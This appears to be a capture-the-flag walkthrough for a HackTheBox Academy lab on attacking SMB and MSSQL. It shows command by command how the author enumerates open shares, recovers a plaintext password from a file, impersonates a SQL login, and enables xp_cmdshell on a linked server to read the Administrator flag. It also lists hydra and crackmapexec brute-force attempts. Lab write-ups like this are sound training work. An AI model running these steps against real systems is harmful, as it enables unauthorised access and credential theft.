# Attacking Common Services - HARD

>HackTheBox Academy Module Assessment LAB walkthrough  
[Attacking SMB](https://academy.hackthebox.com/module/116/section/1167)  
[Attacking SQL Databases](https://academy.hackthebox.com/module/116/section/1169)  

## port Scan NMAP discovery

```
sudo nmap -p- 10.129.1.2
sudo nmap -p 135,445,1433,3389 -sCV -A -O 10.129.1.2
```

>open ports and services:

```
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

## SMB File Shares

>SMB allows the simon user with blank password to read content on file server shares.  

```
smbmap -u 'simon' -H inlanefreight.htb

smbmap -u 'simon' -H inlanefreight.htb -r Home
```  

>SMB client connect with blank password.  

```
smbclient -U 'simon' \\\\10.129.1.2\\Home

recurse
ls

cd \IT\Simon\>

get random.txt
cd \IT\Fiona\> 
get creds.txt
```

>Content of the file `creds.txt`, is the password for fiona, `48Ns72!bns74@S84NNNSl`.   

## Use discovered user FIONA  

>Remote desktop to windows user as FIONA.  

```
xfreerdp /v:10.129.1.2 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /dynamic-resolution /cert:ignore
```

>Remote connect to Microsoft SQL service as Fiona user.  

```
sqsh -S 10.129.1.2 -U '.\\fiona' -P '48Ns72!bns74@S84NNNSl' -h
```  

>In remote desktop windows session open `cmd` for command prompt.
>run `sqlcmd` as Fiona.  

>Enumerate Database and tables on MSSQL  

```
SELECT name FROM master.dbo.sysdatabases
go

use TestingDB
go

SELECT table_name FROM TestAppDB.INFORMATION_SCHEMA.TABLES
go
```  

## Identify Users that current SQL User can Impersonate  

```
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```


## Impersonate User SQL user account: John  

>As the returned value 0 indicates, we do not have the sysadmin role, but we can impersonate the sa user.
>Let us impersonate the user and execute the same commands.
>To impersonate a user, we can use the Transact-SQL statement EXECUTE AS LOGIN and set it to the user we want to impersonate.

```
EXECUTE AS LOGIN = 'john'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
go

```

## Identify linked Servers in MSSQL

>Identify linked Servers in MSSQL.  

```
SELECT srvname, isremote FROM sysservers
go
```

>WINSRV02\SQLEXPRESS
>LOCAL.TEST.LINKED.SRV  


## Execute Commands on Remote LINK SQL Servers  

>The `EXECUTE` statement can be used to send pass-through commands to linked servers. 
>We add our command between parenthesis and specify the linked server between square brackets `([ ])`.  

```
1> EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'show advanced options', 1;
2> go
```

>Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

```
1> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
2> go
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
2> go
```

## Exfiltrate Secret Data - Reading the flag  

>Submit the contents of the flag.txt file on the Administrator Desktop.  

```
EXECUTE("EXEC sp_configure 'show advanced options', 1;") AT [LOCAL.TEST.LINKED.SRV]
go
EXECUTE("RECONFIGURE") AT [LOCAL.TEST.LINKED.SRV]
go
EXECUTE("EXEC sp_configure 'xp_cmdshell', 1;") AT [LOCAL.TEST.LINKED.SRV]
go
EXECUTE('xp_cmdshell "type C:\Users\Administrator\Desktop\flag.txt >c:\users\fiona\desktop\x.txt"') AT [LOCAL.TEST.LINKED.SRV]
go
```  

>read content as current user `Fiona`.  

```
type c:\users\fiona\desktop\x.txt
```  

[Attacking Common Services - Hard](https://academy.hackthebox.com/module/116/section/1468)  

## Extra Commands

>These commands did not succeed in providing any foothold, information or lateral movement.  

```
sudo responder -I tun0
```

```
crackmapexec mssql 10.129.79.226 -u 'john' -p secrets.txt --local-auth
``` 

```
hydra -l john -P /usr/share/wordlists/rockyou.txt 10.129.27.28 mssql 
```  

```
sqsh -S 10.129.27.28 -U john -P '48Ns72!bns74@S84NNNSl' -h
```  


